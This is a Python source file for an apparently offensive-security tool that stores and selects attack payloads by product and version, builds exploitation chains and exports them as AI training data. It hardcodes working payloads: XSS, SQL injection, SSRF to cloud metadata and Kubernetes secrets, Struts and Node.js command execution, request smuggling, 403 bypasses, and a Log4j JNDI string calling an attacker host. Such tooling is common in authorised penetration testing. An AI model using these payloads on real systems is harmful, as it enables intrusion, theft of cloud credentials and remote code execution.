"""
Unified Knowledge System
=========================
Combines vulnerability_kb.py, kb.py, memory.py, and miner.py
PRESERVES ALL vulnerability payloads and critical functionality
"""

import json
import yaml
import re
import hashlib
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from collections import defaultdict
from packaging import version
from packaging.specifiers import SpecifierSet
import math

try:
    import PyPDF2
except ImportError:
    PyPDF2 = None

# ============================================================================
# VULNERABILITY KNOWLEDGE BASE (PRESERVING ALL FROM vulnerability_kb.py)
# ============================================================================

class VulnCategory(Enum):
    """Vulnerability categories based on HackerOne data"""
    XSS = "Cross-Site Scripting"
    SQLI = "SQL Injection"
    SSRF = "Server-Side Request Forgery"
    RCE = "Remote Code Execution"
    IDOR = "Insecure Direct Object Reference"
    XXE = "XML External Entity"
    LFI = "Local File Inclusion"
    RFI = "Remote File Inclusion"
    CSRF = "Cross-Site Request Forgery"
    AUTH_BYPASS = "Authentication Bypass"
    BUSINESS_LOGIC = "Business Logic Flaw"
    REQUEST_SMUGGLING = "HTTP Request Smuggling"
    RACE_CONDITION = "Race Condition"
    INFO_DISCLOSURE = "Information Disclosure"

@dataclass
class VulnPayload:
    """Structure for vulnerability payloads with product/version support"""
    category: VulnCategory
    name: str
    payload: str
    description: str = ""
    confidence_score: float = 0.5
    context: str = ""  # Where to inject (url, header, body, cookie, etc.)
    detection_pattern: str = ""  # Regex or string to detect success
    tags: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    # Product and version fields
    product: Optional[str] = None  # e.g., "nginx", "apache", "wordpress"
    version_spec: Optional[str] = None  # e.g., "<=1.14.0", ">=2.0.0,<2.1.0"
    payload_id: Optional[str] = None  # Unique ID for tracking
    
    def __post_init__(self):
        if not self.payload_id:
            # Generate unique ID from payload content
            self.payload_id = hashlib.md5(f"{self.category.value}:{self.payload}".encode()).hexdigest()[:12]
    
    def matches_version(self, target_version: str) -> bool:
        """Check if payload matches target version"""
        if not self.version_spec or not target_version:
            return True
        
        try:
            spec = SpecifierSet(self.version_spec)
            target_v = version.parse(target_version)
            return target_v in spec
        except Exception:
            return True

@dataclass
class BypassTechnique:
    """Structure for bypass techniques"""
    name: str
    technique: str
    description: str
    applies_to: List[str] = field(default_factory=list)
    success_rate: float = 0.5

class VulnerabilityKnowledgeBase:
    """Central knowledge base for vulnerability patterns and payloads (FULL PRESERVATION)"""
    
    def __init__(self, kb_path: str = "knowledge_base/"):
        self.kb_path = Path(kb_path)
        self.kb_path.mkdir(exist_ok=True)
        
        # Initialize payload storage
        self.payloads: Dict[VulnCategory, List[VulnPayload]] = {
            category: [] for category in VulnCategory
        }
        
        # Initialize bypass techniques
        self.bypass_techniques: List[BypassTechnique] = []
        
        # Load default payloads
        self._load_default_payloads()
        self._load_bypass_techniques()
        
        # Load custom payloads from files
        self.load_custom_payloads()
    
    def _load_default_payloads(self):
        """Load default vulnerability payloads (PRESERVING ALL PAYLOADS)"""
        
        # XSS Payloads with product-specific variants
        xss_payloads = [
            VulnPayload(
                category=VulnCategory.XSS,
                name="Basic Alert XSS",
                payload="<script>alert(1)</script>",
                description="Basic XSS test with alert",
                context="html",
                detection_pattern=r"<script>alert\(1\)</script>",
                confidence_score=0.9,
                product=None,
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.XSS,
                name="Angular Template XSS",
                payload="{{constructor.constructor('alert(1)')()}}",
                description="XSS for Angular applications",
                context="template",
                detection_pattern=r"alert\(1\)",
                confidence_score=0.85,
                product="angular",
                version_spec="<1.6.0"
            ),
            VulnPayload(
                category=VulnCategory.XSS,
                name="WordPress Comment XSS",
                payload='<img src=x onerror="alert(document.domain)">',
                description="XSS via WordPress comment field",
                context="comment",
                confidence_score=0.8,
                product="wordpress",
                version_spec="<5.4.2"
            ),
            VulnPayload(
                category=VulnCategory.XSS,
                name="React dangerouslySetInnerHTML XSS",
                payload='{"__html":"<img src=x onerror=alert(1)>"}',
                description="XSS in React apps using dangerouslySetInnerHTML",
                context="json",
                confidence_score=0.75,
                product="react",
                version_spec=None
            ),
        ]
        
        # SQL Injection Payloads with database-specific variants
        sqli_payloads = [
            VulnPayload(
                category=VulnCategory.SQLI,
                name="MySQL Union SQLi",
                payload="' UNION SELECT NULL,NULL,version()--",
                description="MySQL-specific union injection",
                context="parameter",
                detection_pattern=r"(5\.\d+\.\d+|8\.\d+\.\d+)",
                confidence_score=0.9,
                product="mysql",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SQLI,
                name="PostgreSQL Error SQLi",
                payload="' AND 1=cast((SELECT version()) as int)--",
                description="PostgreSQL error-based injection",
                context="parameter",
                detection_pattern=r"PostgreSQL \d+\.\d+",
                confidence_score=0.85,
                product="postgresql",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SQLI,
                name="MSSQL Time-based SQLi",
                payload="'; WAITFOR DELAY '00:00:05'--",
                description="Microsoft SQL Server time-based blind injection",
                context="parameter",
                confidence_score=0.8,
                product="mssql",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SQLI,
                name="WordPress wpdb SQLi",
                payload="1' AND (SELECT * FROM wp_users LIMIT 1)--",
                description="WordPress database-specific SQLi",
                context="parameter",
                confidence_score=0.85,
                product="wordpress",
                version_spec="<5.8.3"
            ),
        ]
        
        # SSRF Payloads with cloud provider specific variants
        ssrf_payloads = [
            VulnPayload(
                category=VulnCategory.SSRF,
                name="AWS Metadata SSRF",
                payload="http://169.254.169.254/latest/meta-data/",
                description="SSRF to AWS metadata endpoint",
                context="url_parameter",
                confidence_score=0.9,
                product="aws",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SSRF,
                name="GCP Metadata SSRF",
                payload="http://metadata.google.internal/computeMetadata/v1/",
                description="SSRF to Google Cloud metadata",
                context="url_parameter",
                confidence_score=0.9,
                product="gcp",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SSRF,
                name="Azure Metadata SSRF",
                payload="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                description="SSRF to Azure metadata endpoint",
                context="url_parameter",
                confidence_score=0.9,
                product="azure",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.SSRF,
                name="Kubernetes API SSRF",
                payload="https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
                description="SSRF to Kubernetes API",
                context="url_parameter",
                confidence_score=0.85,
                product="kubernetes",
                version_spec=None
            ),
        ]
        
        # Server-specific RCE payloads
        rce_payloads = [
            VulnPayload(
                category=VulnCategory.RCE,
                name="Apache Struts OGNL RCE",
                payload="%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('whoami'))}",
                description="Apache Struts OGNL expression injection",
                context="header",
                confidence_score=0.95,
                product="apache_struts",
                version_spec=">=2.3.0,<2.3.35"
            ),
            VulnPayload(
                category=VulnCategory.RCE,
                name="PHP eval() RCE",
                payload="system('id');",
                description="PHP eval() code execution",
                context="parameter",
                confidence_score=0.9,
                product="php",
                version_spec="<7.2.0"
            ),
            VulnPayload(
                category=VulnCategory.RCE,
                name="Node.js eval RCE",
                payload="require('child_process').exec('whoami')",
                description="Node.js eval exploitation",
                context="json",
                confidence_score=0.85,
                product="nodejs",
                version_spec=None
            ),
            VulnPayload(
                category=VulnCategory.RCE,
                name="Log4j JNDI RCE",
                payload="${jndi:ldap://attacker.com/a}",
                description="Log4Shell JNDI injection",
                context="header",
                confidence_score=0.99,
                product="log4j",
                version_spec=">=2.0.0,<2.17.0"
            ),
        ]
        
        # Request Smuggling Payloads for specific servers
        smuggling_payloads = [
            VulnPayload(
                category=VulnCategory.REQUEST_SMUGGLING,
                name="HAProxy CL.TE Smuggling",
                payload="Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
                description="HAProxy-specific smuggling",
                context="raw_request",
                confidence_score=0.7,
                product="haproxy",
                version_spec="<2.0.25"
            ),
            VulnPayload(
                category=VulnCategory.REQUEST_SMUGGLING,
                name="Nginx TE.CL Smuggling",
                payload="Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n",
                description="Nginx-specific smuggling",
                context="raw_request",
                confidence_score=0.7,
                product="nginx",
                version_spec="<1.17.7"
            ),
        ]
        
        # Add all payloads to knowledge base
        for payload_list in [xss_payloads, sqli_payloads, ssrf_payloads, 
                             rce_payloads, smuggling_payloads]:
            for payload in payload_list:
                self.add_payload(payload)
    
    def _load_bypass_techniques(self):
        """Load 403 bypass techniques (PRESERVING ALL)"""
        
        bypass_techniques = [
            BypassTechnique(
                name="Double Slash",
                technique="//path",
                description="Add double slash before path segment",
                applies_to=["nginx", "apache"],
                success_rate=0.6
            ),
            BypassTechnique(
                name="Path Traversal",
                technique="..//path",
                description="Use path traversal with double slash",
                applies_to=["nginx"],
                success_rate=0.5
            ),
            BypassTechnique(
                name="URL Encoding",
                technique="%2Fpath",
                description="URL encode path separators",
                applies_to=["apache", "nginx"],
                success_rate=0.7
            ),
            BypassTechnique(
                name="Case Variation",
                technique="Path",
                description="Change case of path components",
                applies_to=["windows", "iis"],
                success_rate=0.4
            ),
            BypassTechnique(
                name="Unicode Encoding",
                technique="%ef%bc%8f",
                description="Use Unicode encoded slash",
                applies_to=["nginx", "apache"],
                success_rate=0.5
            ),
            BypassTechnique(
                name="Parameter Pollution",
                technique="?path=value&path=value2",
                description="HTTP parameter pollution",
                applies_to=["all"],
                success_rate=0.3
            ),
            BypassTechnique(
                name="Header Injection",
                technique="X-Original-URL",
                description="Use alternative routing headers",
                applies_to=["nginx", "apache"],
                success_rate=0.6
            ),
            BypassTechnique(
                name="Method Override",
                technique="X-HTTP-Method-Override",
                description="Override HTTP method via header",
                applies_to=["all"],
                success_rate=0.4
            ),
        ]
        
        self.bypass_techniques.extend(bypass_techniques)
    
    def add_payload(self, payload: VulnPayload) -> bool:
        """Add a new payload to the knowledge base"""
        try:
            self.payloads[payload.category].append(payload)
            return True
        except KeyError:
            return False
    
    def get_payloads_by_category(self, category: VulnCategory) -> List[VulnPayload]:
        """Get all payloads for a specific vulnerability category"""
        return self.payloads.get(category, [])
    
    def get_payloads_by_product(self, product: str, version: Optional[str] = None) -> List[VulnPayload]:
        """Get payloads matching a specific product and version"""
        results = []
        
        for category_payloads in self.payloads.values():
            for payload in category_payloads:
                if payload.product and payload.product.lower() == product.lower():
                    if version and payload.version_spec:
                        if payload.matches_version(version):
                            results.append(payload)
                    else:
                        results.append(payload)
                elif not payload.product:
                    results.append(payload)
        
        return sorted(results, key=lambda x: x.confidence_score, reverse=True)
    
    def get_payloads_by_confidence(self, min_confidence: float = 0.5) -> List[VulnPayload]:
        """Get payloads above a confidence threshold"""
        results = []
        for category_payloads in self.payloads.values():
            results.extend([p for p in category_payloads if p.confidence_score >= min_confidence])
        return sorted(results, key=lambda x: x.confidence_score, reverse=True)
    
    def search_payloads(self, keyword: str) -> List[VulnPayload]:
        """Search payloads by keyword"""
        results = []
        keyword_lower = keyword.lower()
        
        for category_payloads in self.payloads.values():
            for payload in category_payloads:
                if (keyword_lower in payload.name.lower() or
                    keyword_lower in payload.description.lower() or
                    keyword_lower in payload.payload.lower() or
                    keyword_lower in [tag.lower() for tag in payload.tags] or
                    (payload.product and keyword_lower in payload.product.lower())):
                    results.append(payload)
        
        return results
    
    def get_bypass_techniques(self, target_server: str = "all") -> List[BypassTechnique]:
        """Get bypass techniques for specific server type"""
        if target_server == "all":
            return self.bypass_techniques
        
        return [t for t in self.bypass_techniques 
                if target_server in t.applies_to or "all" in t.applies_to]
    
    def get_bypass_techniques_for_target(self, fingerprint: Dict) -> List[BypassTechnique]:
        """Get bypass techniques based on target fingerprint"""
        server = fingerprint.get('server', '').lower()
        
        if 'nginx' in server:
            return self.get_bypass_techniques('nginx')
        elif 'apache' in server:
            return self.get_bypass_techniques('apache')
        elif 'iis' in server:
            return self.get_bypass_techniques('iis')
        
        return self.get_bypass_techniques('all')
    
    def generate_fuzzing_list(self, category: VulnCategory, 
                             context: Optional[str] = None,
                             product: Optional[str] = None,
                             version: Optional[str] = None) -> List[str]:
        """Generate a fuzzing list for a specific vulnerability category"""
        payloads = self.get_payloads_by_category(category)
        
        if context:
            payloads = [p for p in payloads if p.context == context]
        
        if product:
            filtered = []
            for p in payloads:
                if not p.product or p.product.lower() == product.lower():
                    if version and p.version_spec:
                        if p.matches_version(version):
                            filtered.append(p)
                    else:
                        filtered.append(p)
            payloads = filtered
        
        return [p.payload for p in payloads]
    
    def save_knowledge_base(self):
        """Save current knowledge base to disk"""
        kb_data = {
            "payloads": {},
            "bypass_techniques": []
        }
        
        for category, payload_list in self.payloads.items():
            kb_data["payloads"][category.value] = [
                {
                    "name": p.name,
                    "payload": p.payload,
                    "description": p.description,
                    "confidence_score": p.confidence_score,
                    "context": p.context,
                    "detection_pattern": p.detection_pattern,
                    "tags": p.tags,
                    "metadata": p.metadata,
                    "product": p.product,
                    "version_spec": p.version_spec,
                    "payload_id": p.payload_id
                }
                for p in payload_list
            ]
        
        kb_data["bypass_techniques"] = [
            {
                "name": t.name,
                "technique": t.technique,
                "description": t.description,
                "applies_to": t.applies_to,
                "success_rate": t.success_rate
            }
            for t in self.bypass_techniques
        ]
        
        kb_file = self.kb_path / "vulnerability_kb.json"
        with open(kb_file, 'w') as f:
            json.dump(kb_data, f, indent=2)
    
    def load_custom_payloads(self):
        """Load custom payloads from files"""
        custom_payloads_dir = self.kb_path / "custom_payloads"
        custom_payloads_dir.mkdir(exist_ok=True)
        
        for json_file in custom_payloads_dir.glob("*.json"):
            try:
                with open(json_file, 'r') as f:
                    data = json.load(f)
                    self._process_custom_payload_data(data)
            except Exception as e:
                print(f"Error loading {json_file}: {e}")
        
        for yaml_file in custom_payloads_dir.glob("*.yaml"):
            try:
                with open(yaml_file, 'r') as f:
                    data = yaml.safe_load(f)
                    self._process_custom_payload_data(data)
            except Exception as e:
                print(f"Error loading {yaml_file}: {e}")
    
    def _process_custom_payload_data(self, data: Dict):
        """Process custom payload data from file"""
        if "payloads" in data:
            for payload_data in data["payloads"]:
                try:
                    category = VulnCategory[payload_data.get("category", "XSS")]
                    payload = VulnPayload(
                        category=category,
                        name=payload_data.get("name", "Custom Payload"),
                        payload=payload_data.get("payload", ""),
                        description=payload_data.get("description", ""),
                        confidence_score=payload_data.get("confidence_score", 0.5),
                        context=payload_data.get("context", ""),
                        detection_pattern=payload_data.get("detection_pattern", ""),
                        tags=payload_data.get("tags", []),
                        metadata=payload_data.get("metadata", {}),
                        product=payload_data.get("product"),
                        version_spec=payload_data.get("version_spec"),
                        payload_id=payload_data.get("payload_id")
                    )
                    self.add_payload(payload)
                except Exception as e:
                    print(f"Error processing payload: {e}")
    
    def generate_ai_training_data(self) -> Dict[str, Any]:
        """Generate training data for AI models"""
        training_data = {
            "vulnerability_patterns": {},
            "exploitation_sequences": [],
            "detection_patterns": {},
            "bypass_strategies": [],
            "product_specific_data": {}
        }
        
        for category in VulnCategory:
            payloads = self.get_payloads_by_category(category)
            training_data["vulnerability_patterns"][category.value] = {
                "payloads": [p.payload for p in payloads],
                "contexts": list(set(p.context for p in payloads if p.context)),
                "confidence_scores": [p.confidence_score for p in payloads],
                "detection_patterns": [p.detection_pattern for p in payloads if p.detection_pattern]
            }
        
        products = set()
        for category_payloads in self.payloads.values():
            for p in category_payloads:
                if p.product:
                    products.add(p.product)
        
        for product in products:
            product_payloads = self.get_payloads_by_product(product)
            training_data["product_specific_data"][product] = {
                "payloads": [p.payload for p in product_payloads],
                "versions": list(set(p.version_spec for p in product_payloads if p.version_spec)),
                "categories": list(set(p.category.value for p in product_payloads))
            }
        
        training_data["bypass_strategies"] = [
            {
                "technique": t.technique,
                "success_rate": t.success_rate,
                "applies_to": t.applies_to
            }
            for t in self.bypass_techniques
        ]
        
        return training_data
    
    def get_exploitation_chain(self, vulnerabilities: List[VulnCategory],
                              product: Optional[str] = None,
                              version: Optional[str] = None) -> List[VulnPayload]:
        """Generate an exploitation chain for multiple vulnerabilities"""
        chain = []
        
        for vuln in vulnerabilities:
            payloads = self.get_payloads_by_category(vuln)
            
            if product:
                filtered = []
                for p in payloads:
                    if not p.product or p.product.lower() == product.lower():
                        if version and p.version_spec:
                            if p.matches_version(version):
                                filtered.append(p)
                        else:
                            filtered.append(p)
                payloads = filtered
            
            if payloads:
                best_payload = max(payloads, key=lambda x: x.confidence_score)
                chain.append(best_payload)
        
        return chain
    
    def update_payload_confidence(self, payload_name: str, 
                                 new_confidence: float, 
                                 category: Optional[VulnCategory] = None):
        """Update confidence score based on exploitation results"""
        search_categories = [category] if category else VulnCategory
        
        for cat in search_categories:
            if cat in self.payloads:
                for payload in self.payloads[cat]:
                    if payload.name == payload_name:
                        payload.confidence_score = (
                            0.7 * payload.confidence_score + 0.3 * new_confidence
                        )
                        return True
        
        return False
    
    def update_knowledge_from_results(self, results: Dict):
        """Update knowledge base from exploitation results"""
        if "payload_name" in results and "success" in results:
            confidence = 0.9 if results["success"] else 0.3
            self.update_payload_confidence(
                results["payload_name"],
                confidence
            )
            self.save_knowledge_base()
    
    def get_payloads_for_testing(self, target: Dict, category: VulnCategory) -> List[Dict]:
        """Get payloads formatted for testing"""
        product = target.get('product')
        version = target.get('version')
        
        payloads = self.generate_fuzzing_list(
            category,
            product=product,
            version=version
        )
        
        return [{"payload": p, "category": category.value} for p in payloads]
    
    def scan_for_vulnerability(self, target_url: str, category: VulnCategory,
                              context: Optional[str] = None,
                              target_info: Optional[Dict] = None) -> List[Dict[str, Any]]:
        """Scan for specific vulnerability type"""
        results = []
        payloads = self.get_payloads_by_category(category)
        
        if context:
            payloads = [p for p in payloads if p.context == context]
        
        if target_info:
            product = target_info.get('product')
            version = target_info.get('version')
            if product:
                filtered = []
                for p in payloads:
                    if not p.product or p.product.lower() == product.lower():
                        if version and p.version_spec:
                            if p.matches_version(version):
                                filtered.append(p)
                        else:
                            filtered.append(p)
                payloads = filtered
        
        for payload in payloads:
            result = {
                "payload": payload,
                "target": target_url,
                "test_url": self._build_test_url(target_url, payload),
                "confidence": payload.confidence_score,
                "product_match": payload.product == target_info.get('product') if target_info else False
            }
            results.append(result)
        
        return results
    
    def _build_test_url(self, base_url: str, payload: VulnPayload) -> str:
        """Build test URL with payload"""
        if payload.context == "parameter":
            return f"{base_url}?test={payload.payload}"
        elif payload.context == "path":
            return f"{base_url}/{payload.payload}"
        else:
            return base_url
    
    def train_ai_model(self):
        """Provide training data to AI orchestrator"""
        return self.generate_ai_training_data()

# ============================================================================
# NEURAL MEMORY AND VECTOR SEARCH (from memory.py)
# ============================================================================

@dataclass
class MemoryItem:
    """Memory item structure"""
    kind: str
    title: str
    content: str
    tags: List[str]
    score: float = 0.0
    
@dataclass
class KBEntry:
    """Knowledge base entry (from kb.py)"""
    title: str
    content: str
    tags: List[str]

class SimpleVectorizer:
    """Simple vectorizer for text search"""
    
    def __init__(self):
        self.vocab = {}
    
    def _tok(self, text: str):
        return [t for t in re.findall(r'[a-z0-9_]+', text.lower()) if len(t) > 2]
    
    def fit_transform(self, docs: List[str]):
        self.vocab = {}
        vecs = []
        for doc in docs:
            counts = defaultdict(int)
            for t in self._tok(doc):
                counts[t] += 1
            for t in list(counts):
                if t not in self.vocab:
                    self.vocab[t] = len(self.vocab)
            vec = [0.0] * len(self.vocab)
            for t, c in counts.items():
                vec[self.vocab[t]] = float(c)
            vecs.append(vec)
        return vecs
    
    def transform(self, docs: List[str]):
        vecs = []
        for doc in docs:
            counts = defaultdict(int)
            for t in self._tok(doc):
                counts[t] += 1
            vec = [0.0] * len(self.vocab)
            for t, c in counts.items():
                if t in self.vocab:
                    vec[self.vocab[t]] = float(c)
            vecs.append(vec)
        return vecs
    
    @staticmethod
    def cosine(a, b):
        dot = sum(x*y for x, y in zip(a, b))
        na = (sum(x*x for x in a) ** 0.5) or 1.0
        nb = (sum(x*x for x in b) ** 0.5) or 1.0
        return dot / (na * nb)

class NeuralMemory:
    """Neural memory with vector search"""
    
    def __init__(self):
        self.items: List[MemoryItem] = []
        self.vec = SimpleVectorizer()
        self._matrix: List[List[float]] = []
    
    def add(self, item: MemoryItem):
        self.items.append(item)
        self._reindex()
    
    def bulk_add(self, items: List[MemoryItem]):
        self.items.extend(items)
        self._reindex()
    
    def _reindex(self):
        corpus = [f"{i.title} {i.content} {' '.join(i.tags)}" for i in self.items]
        self._matrix = self.vec.fit_transform(corpus) if corpus else []
    
    def search(self, query: str, top_k: int = 8):
        if not self.items:
            return []
        qv = self.vec.transform([query])[0]
        scored = [(it, self.vec.cosine(qv, self._matrix[idx])) 
                  for idx, it in enumerate(self.items)]
        scored.sort(key=lambda x: x[1], reverse=True)
        return [{'item': it, 'score': sc} for it, sc in scored[:top_k]]
    
    def reinforce(self, titles: List[str], delta: float = 0.1):
        for it in self.items:
            if it.title in titles:
                it.score = max(0.0, it.score + delta)

# ============================================================================
# DOCUMENT MINER (from miner.py)
# ============================================================================

@dataclass
class DocHit:
    """Document search hit"""
    title: str
    path: str
    summary: str
    score: float

class DocumentMiner:
    """Document mining and indexing"""
    
    def __init__(self, root: str):
        self.root = Path(root)
        self.index: List[Dict[str, Any]] = []
        self.vocab: Dict[str, int] = {}
    
    def _textify(self, p: Path) -> str:
        """Extract text from various file formats"""
        t = p.suffix.lower()
        try:
            if t in {'.txt', '.md'}:
                return p.read_text(errors='ignore')
            if t == '.json':
                data = json.loads(p.read_text(errors='ignore') or '{}')
                return json.dumps(data, indent=2)
            if t in {'.yml', '.yaml'}:
                if yaml:
                    data = yaml.safe_load(p.read_text(errors='ignore')) or {}
                    return json.dumps(data, indent=2)
                else:
                    return p.read_text(errors='ignore')
            if t in {'.html', '.htm'}:
                raw = p.read_text(errors='ignore')
                return re.sub('<[^>]+>', ' ', raw)
            if t == '.pdf' and PyPDF2:
                text = []
                with open(p, 'rb') as f:
                    reader = PyPDF2.PdfReader(f)
                    for pg in reader.pages:
                        text.append(pg.extract_text() or '')
                return '\n'.join(text)
            return p.read_text(errors='ignore')
        except Exception:
            return ''
    
    def _tokens(self, text: str):
        return re.findall(r'[a-z0-9_]{3,}', text.lower())
    
    def build(self):
        """Build document index"""
        self.index.clear()
        self.vocab.clear()
        docs = []
        
        for p in self.root.rglob('*'):
            if not p.is_file():
                continue
            if p.suffix.lower() not in {'.txt', '.md', '.json', '.yml', '.yaml', 
                                        '.html', '.htm', '.pdf'}:
                continue
            text = self._textify(p)
            if not text.strip():
                continue
            tokens = self._tokens(text)
            docs.append({'path': str(p), 'text': text, 'tokens': tokens})
        
        # Build TF-IDF vectors
        from collections import Counter
        df = Counter()
        for d in docs:
            for t in set(d['tokens']):
                df[t] += 1
        
        self.vocab = {t: i for i, (t, _) in enumerate(df.most_common())}
        
        N = max(1, len(docs))
        for d in docs:
            tf = Counter(d['tokens'])
            vec = {}
            for t, c in tf.items():
                if t not in df:
                    continue
                idf = math.log(1 + N / (1 + df[t]))
                vec[self.vocab[t]] = (c / len(d['tokens'])) * idf
            d['vec'] = vec
            d['title'] = Path(d['path']).name
        
        self.index = docs
    
    def _vec_query(self, q: str):
        """Vectorize query"""
        from collections import Counter
        tokens = self._tokens(q)
        tf = Counter(tokens)
        vec = {}
        for t, c in tf.items():
            if t not in self.vocab:
                continue
            vec[self.vocab[t]] = c / len(tokens)
        return vec
    
    @staticmethod
    def _cosine_sparse(a: Dict[int, float], b: Dict[int, float]) -> float:
        """Sparse cosine similarity"""
        keys = set(a.keys()) & set(b.keys())
        dot = sum(a[k] * b[k] for k in keys)
        na = math.sqrt(sum(v*v for v in a.values())) or 1.0
        nb = math.sqrt(sum(v*v for v in b.values())) or 1.0
        return dot / (na * nb)
    
    def _summarize(self, text: str, query: str, max_sents: int = 5) -> str:
        """Generate summary based on query"""
        sents = re.split(r'(?<=[.!?])\s+', text.strip())
        qtok = set(self._tokens(query))
        scored = []
        for s in sents:
            tok = set(self._tokens(s))
            if not tok:
                continue
            overlap = len(qtok & tok) / max(1, len(qtok))
            scored.append((overlap, s))
        scored.sort(reverse=True)
        return ' '.join(s for _, s in scored[:max_sents])
    
    def mine(self, query: str, top_k: int = 5) -> List[DocHit]:
        """Search documents"""
        if not self.index:
            self.build()
        
        qv = self._vec_query(query)
        scored = []
        for d in self.index:
            sc = self._cosine_sparse(qv, d['vec'])
            if sc > 0:
                scored.append((d, sc))
        
        scored.sort(key=lambda x: x[1], reverse=True)
        results = []
        for d, sc in scored[:top_k]:
            results.append(DocHit(
                title=d['title'],
                path=d['path'],
                summary=self._summarize(d['text'], query),
                score=float(sc)
            ))
        return results

# ============================================================================
# UNIFIED KNOWLEDGE SYSTEM
# ============================================================================

class UnifiedKnowledgeSystem:
    """Unified knowledge system combining all functionality"""
    
    def __init__(self, kb_path: str = "knowledge_base/", doc_root: Optional[str] = None):
        # Initialize vulnerability KB
        self.vuln_kb = VulnerabilityKnowledgeBase(kb_path)
        
        # Initialize neural memory
        self.memory = NeuralMemory()
        
        # Initialize document miner if path provided
        self.doc_miner = DocumentMiner(doc_root) if doc_root else None
        
        # Track all knowledge sources
        self.sources = {
            'vulnerability_payloads': self.vuln_kb,
            'memory': self.memory,
            'documents': self.doc_miner
        }
    
    # Vulnerability KB methods (delegate to vuln_kb)
    def get_payloads_by_category(self, category: VulnCategory) -> List[VulnPayload]:
        return self.vuln_kb.get_payloads_by_category(category)
    
    def get_payloads_by_product(self, product: str, version: Optional[str] = None) -> List[VulnPayload]:
        return self.vuln_kb.get_payloads_by_product(product, version)
    
    def get_bypass_techniques(self, target_server: str = "all") -> List[BypassTechnique]:
        return self.vuln_kb.get_bypass_techniques(target_server)
    
    def get_bypass_techniques_for_target(self, fingerprint: Dict) -> List[BypassTechnique]:
        return self.vuln_kb.get_bypass_techniques_for_target(fingerprint)
    
    # Knowledge base methods (from kb.py)
    def ingest(self, entries: List[KBEntry]):
        """Ingest knowledge base entries"""
        items = [MemoryItem(kind='kb', title=e.title, content=e.content, tags=e.tags) 
                for e in entries]
        self.memory.bulk_add(items)
    
    def add_entry(self, entry: KBEntry):
        """Add single knowledge base entry"""
        self.memory.add(MemoryItem(
            kind='kb',
            title=entry.title,
            content=entry.content,
            tags=entry.tags
        ))
    
    def retrieve(self, query: str, k: int = 8) -> List[Dict]:
        """Retrieve relevant knowledge"""
        results = []
        
        # Search memory
        memory_results = self.memory.search(query, top_k=k)
        results.extend(memory_results)
        
        # Search documents if available
        if self.doc_miner:
            doc_results = self.doc_miner.mine(query, top_k=k)
            for doc in doc_results:
                results.append({
                    'item': MemoryItem(
                        kind='document',
                        title=doc.title,
                        content=doc.summary,
                        tags=[],
                        score=doc.score
                    ),
                    'score': doc.score
                })
        
        # Sort by score
        results.sort(key=lambda x: x['score'], reverse=True)
        return results[:k]
    
    def reinforce(self, titles: List[str], delta: float = 0.1):
        """Reinforce knowledge items"""
        self.memory.reinforce(titles, delta)
    
    def search_payloads(self, keyword: str) -> List[VulnPayload]:
        """Search vulnerability payloads"""
        return self.vuln_kb.search_payloads(keyword)
    
    def get_exploitation_chain(self, vulnerabilities: List[VulnCategory],
                              product: Optional[str] = None,
                              version: Optional[str] = None) -> List[VulnPayload]:
        """Get exploitation chain"""
        return self.vuln_kb.get_exploitation_chain(vulnerabilities, product, version)
    
    def update_knowledge_from_results(self, results: Dict):
        """Update knowledge from exploitation results"""
        self.vuln_kb.update_knowledge_from_results(results)
    
    def save(self):
        """Save all knowledge bases"""
        self.vuln_kb.save_knowledge_base()
    
    def get_stats(self) -> Dict:
        """Get knowledge system statistics"""
        stats = {
            'vulnerability_payloads': sum(len(p) for p in self.vuln_kb.payloads.values()),
            'bypass_techniques': len(self.vuln_kb.bypass_techniques),
            'memory_items': len(self.memory.items),
            'indexed_documents': len(self.doc_miner.index) if self.doc_miner else 0,
            'categories': list(VulnCategory.__members__.keys())
        }
        return stats

# ============================================================================
# BACKWARD COMPATIBILITY
# ============================================================================

# Export main classes for backward compatibility
KnowledgeBase = UnifiedKnowledgeSystem
VulnerabilityKB = VulnerabilityKnowledgeBase

class VulnerabilityKBPlugin:
    """Plugin wrapper for backward compatibility"""
    
    def __init__(self, config=None):
        self.config = config
        self.kb = VulnerabilityKnowledgeBase()
    
    def get_payloads_for_testing(self, vuln_type: str, 
                                 target_info: Optional[Dict] = None) -> List[str]:
        try:
            category = VulnCategory[vuln_type.upper()]
            product = target_info.get('product') if target_info else None
            version = target_info.get('version') if target_info else None
            
            return self.kb.generate_fuzzing_list(
                category, 
                product=product,
                version=version
            )
        except KeyError:
            return []
    
    def get_bypass_techniques_for_target(self, server_type: str = "nginx") -> List[Dict]:
        techniques = self.kb.get_bypass_techniques(server_type)
        return [
            {
                "name": t.name,
                "technique": t.technique,
                "success_rate": t.success_rate
            }
            for t in techniques
        ]
    
    def train_ai_model(self):
        return self.kb.generate_ai_training_data()
    
    def update_knowledge_from_results(self, results: Dict):
        self.kb.update_knowledge_from_results(results)
